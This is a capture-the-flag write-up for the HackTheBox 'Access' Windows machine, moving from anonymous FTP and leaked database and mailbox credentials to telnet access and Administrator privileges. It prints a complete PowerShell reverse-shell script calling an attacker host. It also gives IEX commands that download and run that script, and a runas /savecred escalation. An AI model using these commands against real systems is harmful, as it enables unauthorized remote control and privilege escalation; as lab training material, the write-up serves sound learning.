---
title: "HackTheBox - Access"
published: true
---

| Field            | Details                                                                                                                          |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Windows                                                                                                                          |
| **Difficulty**   | Easy                                                                                                                             |
| **Release Date** | 2018-09-29                                                                                                                       |
| **Pwned Date**   | 2026-06-14                                                                                                                       |
| **Tags**         | `ftp` `telnet` `mdbtools` `microsoft access database` `readpst` `powershell reverse shell` `windows credentials manager` `runas` |

## Summary

Access is an Easy difficulty Windows machine that features a ftp server that allows anonymous authentication. From the files obtained via ftp, credentials for the 'security' user are found and initial access is established. Once on the machine, stored credentials for the Administrator account are found in the Windows Credentials Manager allowing to establish a reverse shell as Administrator with the 'runas' command.

## Reconnaissance

### Port scan

Run port scanning

```bash
python portscan.py --target <TARGET_IP>
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/portscan.py). If you want to run standard commands run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 21,23,80 -oN service_scan.txt <TARGET_IP>
```

In any case, the output should look like this

```
[snip]
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
[snip]
```

Notice that the ftp service allows anonymous access

### Ftp enumeration

Connect to ftp (leave password blank when prompted)

```bash
ftp <TARGET_IP>
Connected to 10.129.14.98.
220 Microsoft FTP Service
Name (10.129.14.98:nc19): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

Enumerate with the 'ls' command. You will find two folders: 'Backups' and 'Engineer'.

Download everything locally with

```bash
wget --mirror --no-passive-ftp ftp://anonymous:anonymous@<TARGET_IP>/
```

Each folder contains a single file:

- Backups/backup.mdb
- Engineer/Access Control.zip

The zip file is password-protected, while the other file is a microsoft access database file and may contain sensitive info.

### Db enumeration

Install mdbtools if not available

```bash
sudo apt install mdbtools
```

List db tables

```bash
mdb-tables backup.mdb
```

```
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

Look further into the 'auth_user' table

```bash
mdb-export backup.mdb auth_user > auth_user.csv
```

Open the csv file with your favorite editor, this is the content:

```
id	username	password	Status	last_login	RoleID	Remark
25	admin	admin	1	08/23/18 21:11:47	26
27	engineer	access4u@security	1	08/23/18 21:13:36	26
28	backup_admin	admin	1	08/23/18 21:14:02	26
```

Test these passwords against the zip file

```bash
7z x Access\ Control.zip
```

```
7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
```

The password 'access4u@security' works and the zip is extracted

### Pst enumeration

The zip contains a single file named 'Access Control.pst'

.pst file -> outlook personal storage table. It contains emails, contacts, calendar items, etc...

You can read it with the 'readpst' tool

Install the tool if not available

```bash
sudo apt install readpst
```

Read the file

```bash
readpst "Access Control.pst"
```

```
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

The previous command generates a .mbox file, which you can open with a simple editor.

The interesting content is

```
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```

These are credentials for the user 'security' and can be used to establish a foothold on the machine

## Initial access

You can use the telnet service, found earlier by the port scan

```bash
telnet <TARGET_IP>
```

Type the credentials found earlied when prompted

```
Trying 10.129.14.98...
Connected to 10.129.14.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

Established shell access as the user 'security'

## Privilege escalation

### Shell improvement

Since the telnet shell is pretty bad let's secure a better one creating a reverse shell.

Create a file named 'revshell.ps1' with the content below

```bash
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Serve the shell to the target by starting the python's http server (in the same directory)

```bash
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Listen on port 9001 on the attacking machine

```bash
nc -lvnp 9001
```

On the target run the following command

```powershell
C:\Users\security>powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/revshell.ps1')"
```

You will receive a connection on port 9001 that will establish the reverse shell.

### Enumeration

Use the new shell to look for stored credentials in the Windows Credentials Manager

```powershell
cmdkey /list
```

```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

A stored password for the user Administrator is available. It's possible to use it to run commands as that user with the 'runas' command.

This can be leveraged to spawn a shell with the 'Administrator' user.

### Escalation

Create a copy of the revshell.ps1 file with a different name, such as 'revshell_port9002.ps1'. Change the port to 9002 in the copy, like shown below

```bash
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",9002);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

This is needed because port 9001 is already occupied by the current reverse shell.

Again, listen on port 9002 locally and serve the shell file with the python http server.

Execute the following command on the target

```powershell
PS C:\Users\security> runas /savecred /user:ACCESS\Administrator "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/revshell_port9002.ps1')"
```

You should get a connection on port 9002

```bash
listening on [any] 9002 ...
connect to [10.10.14.131] from (UNKNOWN) [10.129.15.110] 49164

PS C:\Windows\system32> whoami
access\administrator
```

got admin access.
